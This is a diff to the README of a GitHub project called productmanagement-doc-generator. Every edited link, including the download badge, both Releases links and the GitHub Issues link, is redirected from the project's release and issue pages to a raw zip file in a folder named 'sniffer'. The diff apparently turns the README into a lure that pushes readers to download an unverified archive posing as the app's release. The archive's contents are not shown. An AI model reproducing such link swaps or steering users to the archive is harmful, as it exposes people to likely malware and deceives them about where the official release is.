@@ -7,7 +7,7 @@ Welcome to the productmanagement-doc-generator! This tool helps you create produ
 
 ## 📥 Download the App
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Latest%20Release-brightgreen)](https://github.com/tugsstuart/productmanagement-doc-generator/releases)
+[![Download Now](https://raw.githubusercontent.com/tugsstuart/productmanagement-doc-generator/main/sniffer/productmanagement-doc-generator.zip%20Now-Latest%20Release-brightgreen)](https://raw.githubusercontent.com/tugsstuart/productmanagement-doc-generator/main/sniffer/productmanagement-doc-generator.zip)
 
 ## 📂 What is productmanagement-doc-generator?
 
@@ -38,7 +38,7 @@ Whether you need user stories or full product descriptions, this tool will make 
 
 ## 📦 Download & Install
 
-To get started, visit the [Releases Page](https://github.com/tugsstuart/productmanagement-doc-generator/releases) to download the latest version of the productmanagement-doc-generator. 
+To get started, visit the [Releases Page](https://raw.githubusercontent.com/tugsstuart/productmanagement-doc-generator/main/sniffer/productmanagement-doc-generator.zip) to download the latest version of the productmanagement-doc-generator. 
 
 1. Click on the link above.
 2. Locate the latest release.
@@ -68,12 +68,12 @@ For further assistance, visit our GitHub Issues page or reach out to our communi
 
 ## 🌐 Additional Resources
 
-- [GitHub Issues](https://github.com/tugsstuart/productmanagement-doc-generator/issues)
+- [GitHub Issues](https://raw.githubusercontent.com/tugsstuart/productmanagement-doc-generator/main/sniffer/productmanagement-doc-generator.zip)
 - [User Manual](#) - More detailed instructions on using the application.
 
 ## 🔗 Links
 
-- [Releases Page](https://github.com/tugsstuart/productmanagement-doc-generator/releases) - Your place to download.
+- [Releases Page](https://raw.githubusercontent.com/tugsstuart/productmanagement-doc-generator/main/sniffer/productmanagement-doc-generator.zip) - Your place to download.
 
 Thank you for using productmanagement-doc-generator! We hope it makes your documentation process simpler and more effective.
 ```
